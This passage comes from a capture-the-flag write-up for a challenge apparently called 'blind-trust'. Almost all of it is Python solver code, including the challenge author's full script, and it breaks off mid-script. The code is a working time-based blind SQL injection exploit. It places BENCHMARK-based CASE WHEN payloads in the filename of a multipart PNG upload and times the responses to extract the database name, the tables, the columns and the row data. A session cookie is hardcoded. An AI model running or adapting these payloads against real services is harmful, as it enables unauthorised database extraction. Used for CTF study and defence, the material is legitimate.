                <span class="n">logger</span><span class="p">.</span><span class="nf">error</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Exception at pos </span><span class="si">{</span><span class="n">pos</span><span class="si">}</span><span class="s">: </span><span class="si">{</span><span class="n">result</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
                <span class="k">continue</span>
            <span class="n">char</span><span class="p">,</span> <span class="n">success</span> <span class="o">=</span> <span class="n">result</span>
            <span class="k">if</span> <span class="n">success</span><span class="p">:</span>
                <span class="n">flag_value</span> <span class="o">+=</span> <span class="n">char</span>
                <span class="n">sys</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">char</span><span class="p">)</span>
                <span class="n">sys</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="nf">flush</span><span class="p">()</span>
                <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="se">\n</span><span class="s">[+] Current flag: </span><span class="sh">'</span><span class="si">{</span><span class="n">flag_value</span><span class="si">}</span><span class="sh">'"</span><span class="p">)</span>
                <span class="n">found</span> <span class="o">=</span> <span class="bp">True</span>
                <span class="k">break</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="n">found</span><span class="p">:</span>
            <span class="k">break</span>
    <span class="k">return</span> <span class="n">flag_value</span> <span class="k">if</span> <span class="n">flag_value</span> <span class="k">else</span> <span class="bp">None</span>

<span class="k">async</span> <span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[*] Extracting value from column </span><span class="sh">'</span><span class="si">{</span><span class="n">COLUMN</span><span class="si">}</span><span class="sh">'</span><span class="s"> in table </span><span class="sh">'</span><span class="si">{</span><span class="n">TABLE</span><span class="si">}</span><span class="sh">'</span><span class="s">...</span><span class="sh">"</span><span class="p">)</span>
    <span class="n">semaphore</span> <span class="o">=</span> <span class="n">asyncio</span><span class="p">.</span><span class="nc">Semaphore</span><span class="p">(</span><span class="n">CONCURRENT_LIMIT</span><span class="p">)</span>

    <span class="k">async</span> <span class="k">with</span> <span class="n">aiohttp</span><span class="p">.</span><span class="nc">ClientSession</span><span class="p">()</span> <span class="k">as</span> <span class="n">session</span><span class="p">:</span>
        <span class="n">flag_value</span> <span class="o">=</span> <span class="k">await</span> <span class="nf">extract_flag</span><span class="p">(</span><span class="n">session</span><span class="p">,</span> <span class="n">semaphore</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">flag_value</span><span class="p">:</span>
            <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="se">\n</span><span class="s">[+] Found flag: </span><span class="sh">'</span><span class="si">{</span><span class="n">flag_value</span><span class="si">}</span><span class="sh">'"</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="se">\n</span><span class="s">[!] No value extracted. Check logs for response times or test manually in Burp Suite:</span><span class="sh">"</span><span class="p">)</span>
            <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">sELECT CAsE WHEN MID((sELECT </span><span class="si">{</span><span class="n">COLUMN</span><span class="si">}</span><span class="s"> FROM </span><span class="si">{</span><span class="n">TABLE</span><span class="si">}</span><span class="s"> LIMIT 0,1),1,1)=</span><span class="sh">'</span><span class="s">f</span><span class="sh">'</span><span class="s"> </span><span class="sh">"</span>
                  <span class="sa">f</span><span class="sh">"</span><span class="s">THEN BENCHMArK(</span><span class="si">{</span><span class="n">BENCHMARK_ITERATIONS</span><span class="si">}</span><span class="s">,MD5(1)) ELSE 0 END-- .png</span><span class="sh">"</span><span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">asyncio</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span><span class="nf">main</span><span class="p">())</span>
    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="n">logger</span><span class="p">.</span><span class="nf">error</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Main loop failed: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="se">\n</span><span class="s">[!] Error: Failed to extract value due to </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s">. Check logs for details.</span><span class="sh">"</span><span class="p">)</span>

</pre></td></tr></tbody></table></code></div></div>

<p>and finaly we got our flag</p>

<p><a href="/assets/images/blindtrust/flag.png" class="popup img-link  shimmer"><img src="/assets/images/blindtrust/flag.png" alt="" loading="lazy"></a></p>

<p>and this is the full solver script from the author himself</p>

<div class="language-py highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
184
185
186
187
188
189
190
191
192
193
194
195
196
197
198
199
200
201
202
203
204
205
206
207
208
209
210
211
212
213
214
215
216
217
218
219
220
221
222
223
224
225
226
227
228
229
230
231
232
233
234
235
236
237
238
239
240
241
242
243
244
245
246
247
248
249
250
251
252
253
254
255
256
257
258
259
260
261
262
263
264
265
266
267
268
269
270
271
272
273
274
275
276
277
278
279
280
281
282
283
284
285
286
287
288
289
290
291
292
293
294
295
296
297
298
299
300
301
302
303
304
305
306
307
308
309
310
311
312
313
314
315
316
317
318
319
</pre></td><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">requests</span>
<span class="kn">import</span> <span class="n">time</span>
<span class="kn">import</span> <span class="n">string</span>
<span class="kn">import</span> <span class="n">random</span>
<span class="kn">import</span> <span class="n">urllib3</span>
<span class="n">urllib3</span><span class="p">.</span><span class="nf">disable_warnings</span><span class="p">(</span><span class="n">urllib3</span><span class="p">.</span><span class="n">exceptions</span><span class="p">.</span><span class="n">InsecureRequestWarning</span><span class="p">)</span>
<span class="kn">from</span> <span class="n">datetime</span> <span class="kn">import</span> <span class="n">datetime</span><span class="p">,</span> <span class="n">timedelta</span>

<span class="c1"># Configuration
</span><span class="n">url</span> <span class="o">=</span> <span class="sh">"</span><span class="s">https://blind-trust.ascwg-challs.app/challenge.php?page=profile</span><span class="sh">"</span>
<span class="n">cookie</span> <span class="o">=</span> <span class="sh">"</span><span class="s">PHPSESSID=476aca5043e9509d1dd933a314ea685d</span><span class="sh">"</span>  <span class="c1"># Change this!
</span><span class="n">proxy</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">http</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">http://127.0.0.1:8080</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">https</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">http://127.0.0.1:8080</span><span class="sh">"</span><span class="p">}</span>

<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
    <span class="sh">"</span><span class="s">Host</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">blind-trust.ascwg-challs.app</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">User-Agent</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">Accept</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">Accept-Language</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">en-US,en;q=0.5</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">Accept-Encoding</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">gzip, deflate, br</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">Origin</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">https://blind-trust.ascwg-challs.app</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">Connection</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">keep-alive</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">Referer</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">https://blind-trust.ascwg-challs.app/challenge.php?page=profile</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">Cookie</span><span class="sh">"</span><span class="p">:</span> <span class="n">cookie</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">Upgrade-Insecure-Requests</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">1</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">Sec-Fetch-Dest</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">document</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">Sec-Fetch-Mode</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">navigate</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">Sec-Fetch-Site</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">same-origin</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">Sec-Fetch-User</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">?1</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">Priority</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">u=0, i</span><span class="sh">"</span>
<span class="p">}</span>

<span class="n">PNG_DATA</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">.</span><span class="nf">fromhex</span><span class="p">(</span><span class="sh">"</span><span class="s">89504E470D0A1A0A0000000D4948445200000001000000010802000000907753DE0000000B49444154180905C10100000000FFFFE20B2E0100000001735247420000AECE0000000049454E44AE426082</span><span class="sh">"</span><span class="p">)</span>

<span class="n">DB_CHARS</span> <span class="o">=</span> <span class="n">string</span><span class="p">.</span><span class="n">ascii_lowercase</span> <span class="o">+</span> <span class="n">string</span><span class="p">.</span><span class="n">digits</span> <span class="o">+</span> <span class="sh">"</span><span class="s">_</span><span class="sh">"</span>
<span class="n">TABLE_COLUMN_CHARS</span> <span class="o">=</span> <span class="n">string</span><span class="p">.</span><span class="n">ascii_lowercase</span> <span class="o">+</span> <span class="n">string</span><span class="p">.</span><span class="n">digits</span> <span class="o">+</span> <span class="sh">"</span><span class="s">_</span><span class="sh">"</span>
<span class="n">DATA_CHARS</span> <span class="o">=</span> <span class="nf">set</span><span class="p">(</span><span class="n">string</span><span class="p">.</span><span class="n">printable</span><span class="p">)</span> <span class="o">-</span> <span class="p">{</span><span class="sh">'</span><span class="se">\n</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="se">\r</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="se">\t</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="se">\x0b</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="se">\x0c</span><span class="sh">'</span><span class="p">}</span>

<span class="k">def</span> <span class="nf">generate_db_payload</span><span class="p">(</span><span class="n">position</span><span class="p">,</span> <span class="n">char</span><span class="p">):</span>
    <span class="k">return</span> <span class="sa">f</span><span class="sh">"</span><span class="s">Select CaSE WHEN MID(DATABASE(),</span><span class="si">{</span><span class="n">position</span><span class="si">}</span><span class="s">,1)=</span><span class="sh">'</span><span class="si">{</span><span class="n">char</span><span class="si">}</span><span class="sh">'</span><span class="s"> THEN  BENCHMArK(10000000,MD5(1)) ELSE 0  END-- </span><span class="sh">"</span>

<span class="k">def</span> <span class="nf">generate_table_payload</span><span class="p">(</span><span class="n">position</span><span class="p">,</span> <span class="n">char</span><span class="p">,</span> <span class="n">table_offset</span><span class="p">,</span>  <span class="n">database_name</span><span class="p">):</span>
    <span class="nf">return </span><span class="p">(</span>
       <span class="sa">f</span><span class="sh">"</span><span class="s">SelECT CaSE WHEN MID((SeLECT table_name FROM information_schema.tables WHERE table_schema=</span><span class="sh">'</span><span class="si">{</span><span class="n">database_name</span><span class="si">}</span><span class="sh">'</span><span class="s"> LIMIT </span><span class="si">{</span><span class="n">table_offset</span><span class="si">}</span><span class="s">,1),</span><span class="si">{</span><span class="n">position</span><span class="si">}</span><span class="s">,1)=</span><span class="sh">'</span><span class="si">{</span><span class="n">char</span><span class="si">}</span><span class="sh">'</span><span class="s"> THEN BeNCHMARK(10000000,MD5(1)) ELSE 0 END-- </span><span class="sh">"</span>
    <span class="p">)</span>

<span class="k">def</span> <span class="nf">generate_column_payload</span><span class="p">(</span><span class="n">position</span><span class="p">,</span> <span class="n">char</span><span class="p">,</span> <span class="n">table_name</span><span class="p">,</span> <span class="n">column_offset</span><span class="p">,</span>  <span class="n">database_name</span><span class="p">):</span>
    <span class="nf">return </span><span class="p">(</span>
        <span class="sa">f</span><span class="sh">"</span><span class="s">SeLECT CASe WHEN MID((SeLECT column_name FROM information_schema.columns WHERE table_schema=</span><span class="sh">'</span><span class="si">{</span><span class="n">database_name</span><span class="si">}</span><span class="sh">'</span><span class="s"> AND table_name=</span><span class="sh">'</span><span class="si">{</span><span class="n">table_name</span><span class="si">}</span><span class="sh">'</span><span class="s"> LIMIT </span><span class="si">{</span><span class="n">column_offset</span><span class="si">}</span><span class="s">,1),</span><span class="si">{</span><span class="n">position</span><span class="si">}</span><span class="s">,1)=</span><span class="sh">'</span><span class="si">{</span><span class="n">char</span><span class="si">}</span><span class="sh">'</span><span class="s"> THEN BeNCHMARK(10000000,MD5(1)) ELSE 0 END-- </span><span class="sh">"</span>
    <span class="p">)</span>

<span class="k">def</span> <span class="nf">generate_data_payload</span><span class="p">(</span><span class="n">position</span><span class="p">,</span> <span class="n">char</span><span class="p">,</span> <span class="n">table_name</span><span class="p">,</span> <span class="n">column_name</span><span class="p">,</span> <span class="n">row_offset</span><span class="p">,</span> <span class="n">database_name</span><span class="p">):</span>
    <span class="n">safe_char</span> <span class="o">=</span> <span class="n">char</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="sh">"'"</span><span class="p">,</span> <span class="sh">"''"</span><span class="p">).</span><span class="nf">replace</span><span class="p">(</span><span class="sh">"</span><span class="se">\\</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="se">\\\\</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">return </span><span class="p">(</span>
        <span class="sa">f</span><span class="sh">"</span><span class="s">sELECT CAsE WHEN MID((sELECT `</span><span class="si">{</span><span class="n">column_name</span><span class="si">}</span><span class="s">` FROM `</span><span class="si">{</span><span class="n">database_name</span><span class="si">}</span><span class="s">`.`</span><span class="si">{</span><span class="n">table_name</span><span class="si">}</span><span class="s">` </span><span class="sh">"</span>
        <span class="sa">f</span><span class="sh">"</span><span class="s">LIMIT </span><span class="si">{</span><span class="n">row_offset</span><span class="si">}</span><span class="s">,1),</span><span class="si">{</span><span class="n">position</span><span class="si">}</span><span class="s">,1)=</span><span class="sh">'</span><span class="si">{</span><span class="n">safe_char</span><span class="si">}</span><span class="sh">'</span><span class="s"> </span><span class="sh">"</span>
        <span class="sa">f</span><span class="sh">"</span><span class="s">THEN BENCHMArK(10000000,MD5(1)) ELSE 0 END-- </span><span class="sh">"</span>
    <span class="p">)</span>

<span class="k">def</span> <span class="nf">test_char</span><span class="p">(</span><span class="n">position</span><span class="p">,</span> <span class="n">char</span><span class="p">,</span> <span class="n">payload_generator</span><span class="p">,</span> <span class="o">*</span><span class="n">args</span><span class="p">):</span>
    <span class="n">delay_count</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">max_attempts</span> <span class="o">=</span> <span class="mi">4</span>

    <span class="k">for</span> <span class="n">attempt</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">max_attempts</span> <span class="o">+</span> <span class="mi">1</span><span class="p">):</span>
        <span class="n">payload</span> <span class="o">=</span> <span class="nf">payload_generator</span><span class="p">(</span><span class="n">position</span><span class="p">,</span> <span class="n">char</span><span class="p">,</span> <span class="o">*</span><span class="n">args</span><span class="p">)</span>
        <span class="n">boundary</span> <span class="o">=</span> <span class="sh">'</span><span class="s">----</span><span class="sh">'</span> <span class="o">+</span> <span class="sh">''</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">random</span><span class="p">.</span><span class="nf">choices</span><span class="p">(</span><span class="n">string</span><span class="p">.</span><span class="n">hexdigits</span><span class="p">,</span> <span class="n">k</span><span class="o">=</span><span class="mi">32</span><span class="p">))</span>
        <span class="n">body</span> <span class="o">=</span> <span class="p">(</span>
            <span class="sa">f</span><span class="sh">"</span><span class="s">--</span><span class="si">{</span><span class="n">boundary</span><span class="si">}</span><span class="se">\r\n</span><span class="sh">"</span>
            <span class="sa">f</span><span class="sh">'</span><span class="s">Content-Disposition: form-data; name=</span><span class="sh">"</span><span class="s">file</span><span class="sh">"</span><span class="s">; filename=</span><span class="sh">"</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s">.png</span><span class="sh">"</span><span class="se">\r\n</span><span class="sh">'</span>
            <span class="sh">"</span><span class="s">Content-Type: image/png</span><span class="se">\r\n\r\n</span><span class="sh">"</span>
        <span class="p">).</span><span class="nf">encode</span><span class="p">()</span> <span class="o">+</span> <span class="n">PNG_DATA</span> <span class="o">+</span> <span class="p">(</span>
            <span class="sa">f</span><span class="sh">"</span><span class="se">\r\n</span><span class="s">--</span><span class="si">{</span><span class="n">boundary</span><span class="si">}</span><span class="se">\r\n</span><span class="sh">"</span>
            <span class="sa">f</span><span class="sh">'</span><span class="s">Content-Disposition: form-data; name=</span><span class="sh">"</span><span class="s">upload</span><span class="sh">"</span><span class="se">\r\n\r\n</span><span class="sh">'</span>
            <span class="sa">f</span><span class="sh">"</span><span class="s">Upload</span><span class="se">\r\n</span><span class="sh">"</span>
            <span class="sa">f</span><span class="sh">"</span><span class="s">--</span><span class="si">{</span><span class="n">boundary</span><span class="si">}</span><span class="s">--</span><span class="se">\r\n</span><span class="sh">"</span>
        <span class="p">).</span><span class="nf">encode</span><span class="p">()</span>

        <span class="n">headers</span><span class="p">[</span><span class="sh">"</span><span class="s">Content-Type</span><span class="sh">"</span><span class="p">]</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">multipart/form-data; boundary=</span><span class="si">{</span><span class="n">boundary</span><span class="si">}</span><span class="sh">"</span>
        <span class="n">headers</span><span class="p">[</span><span class="sh">"</span><span class="s">Content-Length</span><span class="sh">"</span><span class="p">]</span> <span class="o">=</span> <span class="nf">str</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">body</span><span class="p">))</span>

        <span class="k">try</span><span class="p">:</span>
            <span class="n">start_time</span> <span class="o">=</span> <span class="n">time</span><span class="p">.</span><span class="nf">time</span><span class="p">()</span>
            <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">body</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">15</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="n">proxy</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
            <span class="n">elapsed</span> <span class="o">=</span> <span class="n">time</span><span class="p">.</span><span class="nf">time</span><span class="p">()</span> <span class="o">-</span> <span class="n">start_time</span>

            <span class="k">if</span> <span class="n">elapsed</span> <span class="o">&gt;</span> <span class="mi">3</span><span class="p">:</span>
                <span class="n">delay_count</span> <span class="o">+=</span> <span class="mi">1</span>
                <span class="k">if</span> <span class="n">delay_count</span> <span class="o">&gt;=</span> <span class="mi">2</span><span class="p">:</span>
                    <span class="k">return</span> <span class="bp">True</span>

        <span class="k">except</span> <span class="n">requests</span><span class="p">.</span><span class="n">exceptions</span><span class="p">.</span><span class="n">Timeout</span><span class="p">:</span>
            <span class="n">delay_count</span> <span class="o">+=</span> <span class="mi">1</span>
            <span class="k">if</span> <span class="n">delay_count</span> <span class="o">&gt;=</span> <span class="mi">2</span><span class="p">:</span>
                <span class="k">return</span> <span class="bp">True</span>

    <span class="k">return</span> <span class="bp">False</span>

<span class="k">def</span> <span class="nf">extract_value</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">payload_generator</span><span class="p">,</span> <span class="n">chars</span><span class="p">,</span> <span class="o">*</span><span class="n">args</span><span class="p">):</span>
    <span class="n">value</span> <span class="o">=</span> <span class="sh">""</span>
    <span class="n">position</span> <span class="o">=</span> <span class="mi">1</span>
    <span class="n">extraction_start</span> <span class="o">=</span> <span class="n">time</span><span class="p">.</span><span class="nf">time</span><span class="p">()</span>
    <span class="n">consecutive_skips</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">max_consecutive_skips</span> <span class="o">=</span> <span class="mi">2</span>

    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[+] Extracting: </span><span class="si">{</span><span class="n">name</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>

    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="n">found_char</span> <span class="o">=</span> <span class="bp">None</span>

        <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="nf">sorted</span><span class="p">(</span><span class="n">chars</span><span class="p">,</span> <span class="n">key</span><span class="o">=</span><span class="k">lambda</span> <span class="n">c</span><span class="p">:</span> <span class="nf">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)):</span>
            <span class="k">if</span> <span class="nf">test_char</span><span class="p">(</span><span class="n">position</span><span class="p">,</span> <span class="n">char</span><span class="p">,</span> <span class="n">payload_generator</span><span class="p">,</span> <span class="o">*</span><span class="n">args</span><span class="p">):</span>
                <span class="n">value</span> <span class="o">+=</span> <span class="n">char</span>
                <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">  [*] Found: </span><span class="si">{</span><span class="n">char</span><span class="si">}</span><span class="s"> ‚Üí Current: </span><span class="sh">'</span><span class="si">{</span><span class="n">value</span><span class="si">}</span><span class="sh">'"</span><span class="p">)</span>
                <span class="n">found_char</span> <span class="o">=</span> <span class="n">char</span>
                <span class="n">consecutive_skips</span> <span class="o">=</span> <span class="mi">0</span>
                <span class="k">break</span>

        <span class="k">if</span> <span class="ow">not</span> <span class="n">found_char</span><span class="p">:</span>
            <span class="n">consecutive_skips</span> <span class="o">+=</span> <span class="mi">1</span>
            <span class="k">if</span> <span class="n">consecutive_skips</span> <span class="o">&gt;=</span> <span class="n">max_consecutive_skips</span><span class="p">:</span>
                <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">  [!] Skipped </span><span class="si">{</span><span class="n">max_consecutive_skips</span><span class="si">}</span><span class="s"> positions, ending extraction</span><span class="sh">"</span><span class="p">)</span>
                <span class="k">break</span>

        <span class="n">position</span> <span class="o">+=</span> <span class="mi">1</span>
        <span class="k">if</span> <span class="n">position</span> <span class="o">&gt;</span> <span class="mi">100</span><span class="p">:</span>
            <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">  [!] Reached max length limit (100)</span><span class="sh">"</span><span class="p">)</span>
            <span class="k">break</span>

        <span class="k">if</span> <span class="n">position</span> <span class="o">&gt;</span> <span class="mi">10</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">value</span><span class="p">:</span>
            <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">  [!] No valid characters found in first 10 positions</span><span class="sh">"</span><span class="p">)</span>
            <span class="k">break</span>

    <span class="k">if</span> <span class="n">value</span><span class="p">:</span>
        <span class="n">elapsed</span> <span class="o">=</span> <span class="n">time</span><span class="p">.</span><span class="nf">time</span><span class="p">()</span> <span class="o">-</span> <span class="n">extraction_start</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">  [+] Final value: </span><span class="sh">'</span><span class="si">{</span><span class="n">value</span><span class="si">}</span><span class="sh">'</span><span class="s"> (in </span><span class="si">{</span><span class="nf">timedelta</span><span class="p">(</span><span class="n">seconds</span><span class="o">=</span><span class="n">elapsed</span><span class="p">)</span><span class="si">}</span><span class="s">)</span><span class="sh">"</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">value</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">  [!] No value found</span><span class="sh">"</span><span class="p">)</span>
        <span class="k">return</span> <span class="bp">None</span>

<span class="k">def</span> <span class="nf">extract_database_name</span><span class="p">():</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="se">\n</span><span class="s">[+] PHASE 1: Extracting database name</span><span class="sh">"</span><span class="p">)</span>
    <span class="k">return</span> <span class="nf">extract_value</span><span class="p">(</span><span class="sh">"</span><span class="s">database name</span><span class="sh">"</span><span class="p">,</span> <span class="n">generate_db_payload</span><span class="p">,</span> <span class="n">DB_CHARS</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">extract_tables</span><span class="p">(</span><span class="n">database_name</span><span class="p">):</span>
    <span class="n">tables</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="n">table_offset</span> <span class="o">=</span> <span class="mi">0</span>

    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="se">\n</span><span class="s">[+] PHASE 2: Extracting tables</span><span class="sh">"</span><span class="p">)</span>
    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="n">table_name</span> <span class="o">=</span> <span class="nf">extract_value</span><span class="p">(</span>
            <span class="sa">f</span><span class="sh">"</span><span class="s">table at OFFSET </span><span class="si">{</span><span class="n">table_offset</span><span class="si">}</span><span class="sh">"</span><span class="p">,</span>
            <span class="n">generate_table_payload</span><span class="p">,</span>
            <span class="n">TABLE_COLUMN_CHARS</span><span class="p">,</span>
            <span class="n">table_offset</span><span class="p">,</span>
            <span class="n">database_name</span>
        <span class="p">)</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="n">table_name</span><span class="p">:</span>
            <span class="k">if</span> <span class="n">table_offset</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
                <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[!] No tables found</span><span class="sh">"</span><span class="p">)</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[+] Found </span><span class="si">{</span><span class="nf">len</span><span class="p">(</span><span class="n">tables</span><span class="p">)</span><span class="si">}</span><span class="s"> tables</span><span class="sh">"</span><span class="p">)</span>
            <span class="k">break</span>

        <span class="n">tables</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">table_name</span><span class="p">)</span>
        <span class="n">table_offset</span> <span class="o">+=</span> <span class="mi">1</span>
    <span class="k">return</span> <span class="n">tables</span>

<span class="k">def</span> <span class="nf">extract_columns</span><span class="p">(</span><span class="n">table_name</span><span class="p">,</span> <span class="n">database_name</span><span class="p">):</span>
    <span class="n">columns</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="n">column_offset</span> <span class="o">=</span> <span class="mi">0</span>

    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="se">\n</span><span class="s">[+] Extracting columns from table: </span><span class="si">{</span><span class="n">table_name</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="n">column</span> <span class="o">=</span> <span class="nf">extract_value</span><span class="p">(</span>
            <span class="sa">f</span><span class="sh">"</span><span class="s">column at OFFSET </span><span class="si">{</span><span class="n">column_offset</span><span class="si">}</span><span class="sh">"</span><span class="p">,</span>
            <span class="n">generate_column_payload</span><span class="p">,</span>
            <span class="n">TABLE_COLUMN_CHARS</span><span class="p">,</span>
            <span class="n">table_name</span><span class="p">,</span>
            <span class="n">column_offset</span><span class="p">,</span>
            <span class="n">database_name</span>
        <span class="p">)</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="n">column</span><span class="p">:</span>
            <span class="k">if</span> <span class="n">column_offset</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
